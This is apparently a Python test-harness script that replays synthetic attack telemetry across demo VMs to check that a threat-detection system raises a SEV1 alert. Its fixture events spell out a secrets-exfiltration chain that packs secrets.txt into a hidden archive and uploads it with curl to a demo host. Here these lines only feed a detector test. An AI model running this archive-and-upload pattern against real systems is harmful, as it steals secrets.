#!/usr/bin/env python3
"""Replay synthetic Sentinel telemetry on the local Multipass demo network."""

import argparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
import json
import re
import socket
import subprocess
import sys
import time
from urllib.request import Request, urlopen
from uuid import uuid4


NODES = ("vm-a", "vm-b", "vm-c")
INGEST = "http://10.97.0.1:8001/events"
API = "http://127.0.0.1:8000"
VM_SCRIPT = "/home/ubuntu/sentinel-replay"


def fixture_events(node, run_id):
    archive = f"/tmp/.cache-bundle-{node}-{run_id[-12:]}.tgz"
    protected_file = "/srv/sensitive_data/secrets.txt"
    dest = "10.97.0.1:8443"
    upload = f"curl --data-binary @{archive} http://{dest}/upload"
    return (
        ("file", {"op": "access_granted", "path": protected_file,
                  "resource": "demo-vault", "reason": "verified_token"}),
        ("file", {"op": "create", "path": archive, "bytes": 169, "hidden_dotfile": True}),
        ("process", {"cmd": f"tar -czf {archive} secrets.txt", "source": "bash_history", "parent": "bash"}),
        ("process", {"cmd": upload, "source": "bash_history", "parent": "bash"}),
        ("network", {"dst": dest, "proto": "HTTP", "bytes_out": 169,
                     "internal": False, "unapproved_egress": True, "cmd": upload}),
    )


def send_from_vm(node, run_id):
    sent = 0
    for channel, payload in fixture_events(node, run_id):
        request = Request(INGEST, data=json.dumps({
            "schema_version": 1,
            "run_id": run_id,
            "event_id": f"evt-{uuid4().hex}",
            "source_id": node,
            "channel": channel,
            "event_time": datetime.now(timezone.utc).isoformat(),
            "payload": payload,
        }).encode(), headers={"Content-Type": "application/json"})
        with urlopen(request, timeout=5) as response:
            if response.status != 201:
                raise RuntimeError(f"{node}: ingest returned HTTP {response.status}")
        sent += 1
        time.sleep(0.06)
    print(f"{node}: sent {sent} synthetic events ({run_id})", flush=True)


def get_json(path, *, method="GET", timeout=5):
    with urlopen(Request(API + path, method=method), timeout=timeout) as response:
        return json.load(response)


def replay_from_host(nodes, *, reset):
    health = get_json("/health")
    print(f"Live VEGA: {health['reasoner_mode']} / {health['stream_backend']}", flush=True)
    if reset:
        if get_json("/api/demo/reset", method="POST")["status"] != "reset":
            raise RuntimeError("VEGA did not confirm the demo reset")
        print("Demo reset to WATCH.", flush=True)
    run_id = "synthetic-e2e-" + uuid4().hex[:12]

    def trigger(node):
        reply = subprocess.run(
            ["multipass", "exec", node, "--", VM_SCRIPT, "--run-id", run_id],
            text=True, capture_output=True, timeout=35,
        )
        print(reply.stdout.strip() or f"{node}: no replay output", flush=True)
        if reply.returncode:
            raise RuntimeError(f"{node}: {reply.stderr.strip() or 'VM replay failed'}")

    with ThreadPoolExecutor(max_workers=len(nodes)) as pool:
        list(pool.map(trigger, nodes))
    print("Closing the current window and waiting for Sentinel…", flush=True)
    result = get_json("/api/demo/flush-window?wait=true", method="POST", timeout=75)
    window = result["window_id"]
    signal = result.get("council_signal") or {}
    state = get_json("/api/state")
    event_ids = {node: set() for node in nodes}
    for event in state["events"]:
        if event["run_id"] == run_id and event["source_id"] in event_ids:
            event_ids[event["source_id"]].add(event["event_id"])
    channels = {node: set() for node in nodes}
    cited_channels = {node: set() for node in nodes}
    cited_findings = set(signal.get("finding_refs", []))
    for finding in state["findings"]:
        node = finding["source_id"]
        if finding["window_id"] != window or node not in channels:
            continue
        if event_ids[node].intersection(finding["evidence_event_ids"]):
            channels[node].add(finding["channel"])
            if finding["finding_id"] in cited_findings:
                cited_channels[node].add(finding["channel"])
    print(f"{window}: {result['status']} ({result['findings_count']} findings); VEGA mode: {state['threat_mode']}")
    for node in nodes:
        print(f"  {node}: {', '.join(sorted(channels[node])) or 'no findings for this replay'}")
    if not signal:
        print("No Council signal for this window.")
        return 1
    sources = set(signal["source_ids"])
    print(f"Council: {signal['severity']} — {', '.join(sorted(sources))}")
    if signal["severity"] != "SEV1" or not set(nodes) <= sources:
        return 1
    if any(len(cited_channels[node]) < 2 for node in nodes):
        print("Council did not cite at least two replay channels for every selected node.")
        return 1
    return 0


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("nodes", nargs="*", metavar="VM", help="Host only: VM targets (default: vm-a vm-b)")
    parser.add_argument("--reset", action="store_true", help="Host only: clear existing demo telemetry and state first")
    parser.add_argument("--run-id", help=argparse.SUPPRESS)
    args = parser.parse_args()
    node = socket.gethostname()
    try:
        if node in NODES:
            if args.nodes or args.reset:
                parser.error("on a VM, run the replay without target or reset arguments")
            run_id = args.run_id or "synthetic-e2e-" + uuid4().hex[:12]
            if not re.fullmatch(r"synthetic-e2e-[a-f0-9]{12}", run_id):
                parser.error("invalid synthetic run ID")
            send_from_vm(node, run_id)
            return 0
        if args.run_id:
            parser.error("--run-id is only used on the demo VMs")
        nodes = tuple(dict.fromkeys(args.nodes)) or NODES[:2]
        if not set(nodes) <= set(NODES):
            parser.error("select vm-a, vm-b, or vm-c")
        return replay_from_host(nodes, reset=args.reset)
    except (OSError, ValueError, KeyError, RuntimeError, subprocess.TimeoutExpired) as exc:
        print(f"Demo could not complete: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
